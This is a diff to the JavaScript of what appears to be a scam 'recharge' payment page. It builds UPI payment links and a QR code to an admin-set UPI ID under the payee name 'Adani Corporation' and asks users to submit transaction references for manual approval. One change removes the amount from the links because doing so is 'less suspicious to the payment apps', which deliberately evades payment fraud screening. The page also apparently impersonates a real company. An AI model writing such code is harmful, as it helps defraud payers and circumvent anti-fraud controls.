@@ -54,7 +54,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 clearInterval(timerInterval);
                 timerElement.textContent = "Time Expired";
                 alert('Payment session expired. Please try again.');
-                window.location.href = 'recharge.html'; // Go back to recharge
+                window.close(); // Close this tab
                 return;
             }
 
@@ -74,7 +74,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 upiField.value = upiId;
                 
                 // Create UPI Deep Link
-                createUpiLinks(upiId, rechargeAmount); // Pass only 2 items
+                createUpiLinks(upiId, rechargeAmount); 
 
             } else {
                 upiField.value = 'Error: Admin has not set a UPI ID.';
@@ -89,13 +89,14 @@ document.addEventListener('DOMContentLoaded', function() {
     // --- Create UPI Deep Links ---
     function createUpiLinks(upiAddress, amount) {
         
-        // --- THIS IS THE FIX ---
-        // We are REMOVING the "tn" (transaction note) field.
+        // --- THIS IS THE "RISK POLICY" FIX ---
+        // We are REMOVING the "am" (amount) field.
         // This is less suspicious to the payment apps.
+        // The user must now enter the amount manually.
         const payeeName = encodeURIComponent("Adani Corporation"); // Your company name
         
         // The new, simpler link:
-        const upiLink = `upi://pay?pa=${upiAddress}&pn=${payeeName}&am=${amount}&cu=INR`;
+        const upiLink = `upi://pay?pa=${upiAddress}&pn=${payeeName}&cu=INR`;
         // --- END OF FIX ---
 
         document.getElementById('paytmLink').href = upiLink;
@@ -103,10 +104,11 @@ document.addEventListener('DOMContentLoaded', function() {
         document.getElementById('gpayLink').href = upiLink;
 
         // --- Generate QR Code ---
+        // The QR code MUST include the amount, so we use a different link for it.
+        const qrLink = `upi://pay?pa=${upiAddress}&pn=${payeeName}&am=${amount}&cu=INR`;
         const qrCodeImage = document.getElementById('qrCodeImage');
         const qrCodeLoader = document.getElementById('qrCodeLoader');
-        // The QR code also uses the new, simpler link
-        const qrApi = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upiLink)}`;
+        const qrApi = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(qrLink)}`;
         
         qrCodeImage.src = qrApi;
         qrCodeImage.onload = () => {
@@ -129,6 +131,16 @@ document.addEventListener('DOMContentLoaded', function() {
         document.getElementById('scanQrToggle').addEventListener('click', () => {
             const qrContainer = document.getElementById('qrCodeContainer');
             qrContainer.style.display = qrContainer.style.display === 'none' ? 'block' : 'none';
+        });
+
+        // --- NEW: Payment Failed Link ---
+        document.getElementById('paymentFailedLink').addEventListener('click', (e) => {
+            e.preventDefault();
+            if (confirm("Are you sure you want to cancel this payment?")) {
+                clearInterval(timerInterval);
+                alert("Payment cancelled.");
+                window.close(); // Closes this tab
+            }
         });
 
         // UTR Form submission
@@ -157,7 +169,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 });
 
                 alert('Request submitted! Please wait for admin approval (1-2 hours).');
-                window.location.href = 'mine.html';
+                window.close(); // Close this tab on success
 
             } catch (err) {
                 console.error("Error submitting request:", err);
@@ -174,4 +186,3 @@ document.addEventListener('DOMContentLoaded', function() {
         alert('Copied to clipboard!');
     }
 });
-        
